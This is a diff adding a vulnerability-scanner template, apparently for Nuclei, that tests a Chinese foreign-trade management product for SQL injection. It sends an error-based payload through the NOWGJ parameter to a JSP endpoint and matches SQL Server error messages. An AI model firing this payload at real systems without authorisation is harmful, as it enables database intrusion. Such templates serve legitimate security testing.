@@ -1,0 +1,30 @@
+id: poc-yaml-51boss-setautogj-sqli
+info:
+  name: 博斯外贸管理软件 setAUTOGJ SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Potential SQL Injection vulnerability in 博斯外贸管理软件 setAUTOGJ parameter.
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/crm/module/DCreceiveBox.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: setAUTOGJ=Y&NOWGJ=1+and+1=@@version--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: 
+          - 200
+      - type: word
+        part: body
+        words:
+          - "java.sql.SQLException"
+          - "Microsoft SQL Server"
+      - type: regex
+        part: body
+        regex:
+          - "转换为数据类型为"
+          - "发生语法错误"
